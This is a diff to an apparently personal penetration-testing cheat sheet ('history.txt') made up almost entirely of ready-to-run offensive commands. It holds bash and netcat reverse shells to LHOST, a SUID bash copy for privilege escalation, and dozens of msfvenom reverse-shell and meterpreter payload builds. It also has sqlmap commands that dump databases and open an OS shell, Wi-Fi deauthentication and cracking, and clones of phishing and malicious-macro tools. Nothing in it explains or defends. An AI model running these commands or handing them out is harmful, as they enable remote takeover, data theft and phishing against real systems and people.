@@ -1,8 +1,6 @@
 https://github.com/melnicek/melnicek.github.io/edit/master/history.txt
 
 ffuf -w wordlist:FUZZ -u http://TARGET/FUZZ
-ffuf -w wordlist:FUZZ -u http://TARGET/FUZZ -recursion -recursion-depth 1 -e .php -v
-ffuf -w wordlist:FUZZ -u https://FUZZ.TARGET/
 ffuf -w wordlist:FUZZ -u http://TARGET/ -H 'Host: FUZZ.TARGET' -fs xxx
 ffuf -w wordlist:FUZZ -u http://TARGET/admin/admin.php?id=FUZZ -fs xxx
 ffuf -w wordlist:FUZZ -u http://TARGET/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
@@ -11,6 +9,23 @@ SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 SecLists/Discovery/Web-Content/web-extensions.txt
 SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 SecLists/Discovery/Web-Content/burp-parameter-names.txt
+
+bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
+rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/y
+rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet LHOST LPORT >/tmp/y
+nc -e /bin/sh LHOST LPORT
+nc -c /bin/sh LHOST LPORT
+
+SHELL=/bin/bash script -q /dev/null
+[Ctrl + Z]
+stty raw -echo
+fg
+reset
+xterm
+
+cp /bin/bash /tmp/yz
+chmod +s /tmp/yz
+/tmp/yz -p
 
 smbclient -L //RHOST
 smbclient //RHOST/SHARE
@@ -33,25 +48,6 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 
 https://github.com/mthbernardes/LFI-Enum.git
 
-bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
-
-nc -e /bin/sh LHOST LPORT
-nc -c /bin/sh LHOST LPORT
-rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/y
-
-rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/ssh -i 2>&1|telnet LHOST LPORT >/tmp/y
-
-SHELL=/bin/bash script -q /dev/null
-[Ctrl + Z]
-stty raw -echo
-fg
-reset
-xterm
-
-cp /bin/bash /tmp/yz
-chmod +s /tmp/yz
-/tmp/yz -p
-
 sudo tcpdump -D
 sudo tcpdump -i INTERFACE
 sudo tcpdump -i INTERFACE -e
@@ -59,3 +55,95 @@ sudo tcpdump -i INTERFACE -X
 sudo tcpdump -i INTERFACE host HOST
 sudo tcpdump -i INTERFACE src host HOST
 sudo tcpdump -i INTERFACE tcp src port PORT
+
+amass enum -d DOMAIN -ip -src -dir OUT
+amass intel -asn ASN -dir OUT
+amass intel -whois -d DOMAIN -dir OUT
+amass db -dir INPUT -list
+amass db -dir INPUT -enum ID -show
+amass viz -dir INPUT -d3
+
+sniper -t DOMAIN
+sniper -t DOMAIN -m stealth -o -re
+
+./theHarvester.py -d DOMAIN -l 500 -b google,bing,yahoo,duckduckgo
+./theHarvester.py -d DOMAIN -c
+./theHarvester.py -d DOMAIN -l 500 -b google,bing,yahoo,duckduckgo -n
+./theHarvester.py -d DOMAIN -l 500 -b linkedin
+./theHarvester.py -d DOMAIN -l 500 -b twitter
+./theHarvester.py -d DOMAIN -l 500 -b all
+
+recon-ng
+> workspaces create DOMAIN
+> options list
+> db insert TABLE
+> show TABLE
+> marketplace search
+> marketplace install SMART
+> modules search
+> modules load MODULE
+> info
+> run
+
+recon-web --host 0.0.0.0
+
+setoolkit
+
+nikto -host URL/RHOST/FILE
+nikto -Plugins 'PLUGIN' -host URL
+
+## raw shell
+msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x86.elf
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x64.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x86.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x64.elf
+msfvenom -p php/reverse_php LHOST=LHOST LPORT=LPORT -f raw > shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war > shell.war
+msfvenom -p windows/shell/reverse_tcp LHOST=LHOST LPORT=LPORT -f asp > shell.asp
+
+## meterpreter
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x86.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe > shell-x64.exe
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x86.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x64.elf
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x86.elf
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf > shell-x64.elf
+msfvenom -p php/meterpreter_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > shell.php
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw > example.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f war > example.war
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f asp > shell.asp
+
+airmon-ng check
+airmon-ng check kill
+airmon-ng start INTERFACE
+airodump-ng INTERFACE
+airodump-ng INTERFACE --bssid APMAC -c CHANNEL -w CAPFILE
+aireplay-ng INTERFACE --deauth 20 -a APMAC -h CLIENTMAC
+aircrack-ng -w WORDLIST CAPFILE
+airmon-ng stop INTERFACE
+systemctl start network-manager
+
+git clone https://github.com/P0cL4bs/wifipumpkin3
+
+git clone https://github.com/gophish/gophish
+
+git clone https://github.com/rsmusllp/king-phisher
+
+git clone https://github.com/curi0usJack/luckystrike
+
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch --current-user --current-db
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch -D DATABASE --tables
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch -D DATABASE -T TABLE --dump
+sqlmap -i URL -p PARAMETER --cookie="COOKIE" --batch --os-shell
+
+git clone https://github.com/sevagas/macro_pack
+
+git clone https://github.com/SecureAuthCorp/impacket
